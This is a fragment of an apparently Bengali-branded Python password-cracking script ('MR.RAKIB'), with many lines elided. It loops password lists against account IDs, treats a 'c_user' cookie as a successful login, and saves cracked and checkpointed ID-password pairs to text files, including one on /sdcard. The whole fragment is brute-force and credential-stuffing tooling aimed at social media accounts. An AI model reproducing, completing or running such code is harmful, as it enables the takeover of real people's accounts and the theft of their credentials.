...
def menu():
			...
			if riaz in ['1','01']:
				...
				os.system('xdg-open https:/wa.me/+8801744864239');menu()
			elif riaz in ['8','08']:
				exit('')
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mMR.RAKIB\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[RAKIB-OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[RAKIB-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[RAKIB-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/RAKIB-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[RAKIB-CP] '+cid+' | '+ps+'\33[0;97m')
				open('RAKIB-cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
